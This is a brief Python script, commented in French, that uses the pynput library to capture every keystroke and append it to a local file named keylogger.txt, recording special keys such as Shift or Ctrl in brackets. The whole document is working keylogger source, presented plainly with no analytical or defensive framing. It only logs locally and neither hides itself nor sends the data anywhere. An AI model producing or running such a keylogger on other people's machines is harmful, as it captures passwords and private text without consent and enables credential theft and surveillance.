from pynput.keyboard import Listener

# Fichier pour enregistrer les frappes
log_file = "keylogger.txt"

def on_press(key):
    try:
        # Enregistre la touche pressée
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Cas des touches spéciales (Shift, Ctrl, etc.)
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

# Détecter les frappes
with Listener(on_press=on_press) as listener:
    listener.join()
